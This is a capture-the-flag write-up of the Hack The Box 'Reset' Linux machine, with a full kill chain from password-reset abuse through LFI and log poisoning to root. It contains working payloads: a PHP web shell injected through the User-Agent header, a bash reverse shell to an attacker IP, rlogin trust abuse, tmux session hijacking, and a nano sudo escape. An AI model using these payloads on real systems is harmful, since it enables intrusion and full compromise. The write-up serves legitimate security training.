---
tags:
  - htb
  - linux
  - easy
  - writeup
cve:
techniques:
  - password-reset
  - log-poisoning
  - lfi
  - reverse-shell
  - r-services
  - tmux-hijacking
  - sudo-abuse
---
# Reset (Linux)

| Field              | Value            |
| ------------------ | ---------------- |
| OS                 | Linux            |
| Difficulty         | Easy             |
| Box IP             | `10.129.234.130` |
| Attacker IP (tun0) | `<attacker-ip>`  |

> [!info] Kill Chain
> [[Password Reset Abuse]] → admin dashboard → [[Mail and Log Poisoning|Log Poisoning]] (via [[Local File Inclusion|LFI]]) → RCE → [[Reverse Shell]] → [[R-Services Abuse]] (rlogin as `sadm`) → [[tmux Hijacking]] (password leak) → [[Sudo Abuse]] (nano) → **root**

---

# 1 · Enumeration
- `nmap -sC -sV 10.129.234.130` → 5 TCP ports open.
- **Port 80**: Apache (Ubuntu) → logs under `/var/log/apache2/` (`access.log`, `error.log`). The `access.log` contains the freely chosen **User-Agent** → potential log-poisoning carrier ([[Mail and Log Poisoning|Log Poisoning]]).
	- principle: attacker-controllable inputs (e.g. User-Agent) that are stored unfiltered (e.g. in the log) are potential entry points for code injection
- **R-Services** (predecessor of SSH) → see [[R-Services Abuse]]:
	- outdated remote-login services without a password, authentication via host/username trust → security-critical, here the later path to user `sadm`
```
512/tcp open  exec   netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell  Netkit rshd
```

# 2 · Foothold

## 2.1 Password Reset → [[Password Reset Abuse]]
- `http://10.129.234.130` → reset form; password for `admin` reset.
- **DevTools → Network → POST → Response**: `new_password: 24bc0464`.
	- the new password is in the server **response** → invisible in the browser, but readable in plaintext in the DevTools (Network)
- Login with `admin` + this password → **admin dashboard** (log viewer with POST parameter `file=`).
	- the log viewer selects which file to show via the POST parameter `file=` → normally a fixed log path
	- `file=` set to an unrelated path (`/etc/passwd`) returned its contents → files are included from the parameter unfiltered = [[Local File Inclusion|LFI]], the carrier for the next steps

## 2.2 Session check → [[curl]]
Log read via the session cookie (`-b PHPSESSID`):
```bash
curl http://10.129.234.130/dashboard.php \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k" \
  --data-urlencode "file=/var/log/apache2/access.log"
```
=> The log contains the client's own User-Agent (`Mozilla/5.0 …`) unchecked → poisonable.
- `-b "PHPSESSID=…"` sends the login cookie → without a valid session there is no access to the log viewer
- the client's User-Agent appears unchanged in the log → input is stored verbatim. Next step: a PHP payload in place of a browser name

## 2.3 Log Poisoning → [[Mail and Log Poisoning|Log Poisoning]] → RCE
**(1)** PHP web shell written as the User-Agent into the log:
```bash
curl http://10.129.234.130/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k"
```
**(2)** Log included via LFI + command triggered via GET:
```bash
curl "http://10.129.234.130/dashboard.php?cmd=id" \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k" \
  --data-urlencode "file=/var/log/apache2/access.log"
# => uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```
> [!note] POST vs. GET in the same request
> `file=` (the file to read) goes via the **POST body**, `cmd=` (the web shell's command) via the **URL parameter**.

- two steps: (1) write PHP code into the log, (2) include the log via `file=` → PHP executes the code, the web shell reads the command from `cmd=`
- `uid=33(www-data)` = code execution achieved, but only as the web server user. Not a regular account, but enough for the reverse shell

## 2.4 Reverse Shell → [[Reverse Shell]]
```bash
# Terminal 1 (Kali) – listener
nc -lvnp 4444
# Terminal 2 – trigger the payload
curl "http://10.129.234.130/dashboard.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'" \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k" \
  --data-urlencode "file=/var/log/apache2/access.log"
```
> [!warning] URL encoding in the cmd URL
> Special characters must be encoded: `+` = space, `%26` = `&`, `'…'` = single quotes (otherwise the local bash captures them).

- reverse shell instead of web shell: the web shell is cumbersome (each command a separate curl) → the reverse shell delivers a full interactive shell
- flow: `nc` listens locally on 4444, the payload tells the box to connect back to my IP:4444 and attach a bash. `0>&1`/`>&` route input/output over the connection

## User flag
```bash
cat /home/sadm/user.txt
# <redacted>
```

---

# 3 · Privilege Escalation

## 3.1 R-Services Abuse → [[R-Services Abuse]]
- goal: move from the heavily restricted `www-data` to a regular user. Candidate: `sadm`
- Real users (service accounts discarded → [[etc-passwd]]):
```bash
grep -vE 'nologin|false' /etc/passwd
# root ... local (1000) ... sadm (1001)
```
	- `-vE 'nologin|false'` filters out all entries with shell `nologin`/`false` = pure service accounts. What remains are the actually loggable users
- `hosts.equiv`:
```bash
cat /etc/hosts.equiv
# + sadm        <- sadm may log in without a password via R-Service
```
	- this file is the R-Services trust list. `+ sadm` allows any host to log in as `sadm` without a password → exactly what gets exploited
- User of the same name created on Kali, login via rlogin → [[rlogin]]:
```bash
sudo apt install rsh-client -y
sudo useradd sadm -m -s /bin/bash
sudo su - sadm
rlogin -l sadm 10.129.234.130         # login without password
```
	- principle: R-Services trust the **username**, not a password. So I create a `sadm` on Kali as well, switch to it locally (`su - sadm`) and log in → the box accepts me as its `sadm`

## 3.2 tmux Hijacking → [[tmux Hijacking]]
- `sudo -l` shows `timestamp_timeout=-1` → if sadm confirmed `sudo` with a password **once**, the authentication remains valid **indefinitely**.
- Exactly this **already authenticated** session is still running (`w` → sadm on `pts/3` in a tmux session). If I attach to it, I inherit the valid sudo state without being asked for a password again
	- tmux communicates over a socket in `/tmp` → with read access to it the running session can be taken over via `attach`, as if sitting at sadm's terminal
	- the scrollback history often contains the user's earlier input → here the sudo password in plaintext
```bash
w                                     # sadm runs in a tmux session (pts/3)
ls -la /tmp/tmux-1001/                # socket: /tmp/tmux-1001/default
tmux -S /tmp/tmux-1001/default attach
```
=> The session's scrollback history also shows that sadm used `sudo` here – including the password in plaintext:
```
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
```

## 3.3 Sudo Abuse (nano) → [[Sudo Abuse]]
```bash
sudo -l
# timestamp_timeout=-1
# (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
```
nano as a root shell (GTFOBins):
```
sudo nano /etc/firewall.sh
Ctrl+R → Ctrl+X
reset; sh 1>&0 2>&0
```
=> root shell.
- principle: `nano` may be started as root. But nano can run commands (`Ctrl+R` = read file, `Ctrl+X` = command instead of file) → this can start a shell that runs as root
- GTFOBins = reference for such techniques: which program can be abused with root privileges and how to spawn a shell from it → the first reference for every permitted sudo command

## Root flag
```bash
cat /root/root.txt
# <redacted>
```

---

## Notes / Rabbit Holes
- **Apache log paths**: Ubuntu/Debian `/var/log/apache2/`, RedHat/CentOS `/var/log/httpd/`.
- **Service accounts** (`nologin`/`/bin/false`) in `/etc/passwd` are not real login users – they only exist so programs can run under their own user (e.g. Apache = `www-data`).
- **R-Services condition**: the local user (Kali) must have the **same name** as the target user (`sadm`).
- **`timestamp_timeout=-1`**: `sudo` authenticated once → stays valid. From the box description: "detached tmux session is used to abuse sudo".
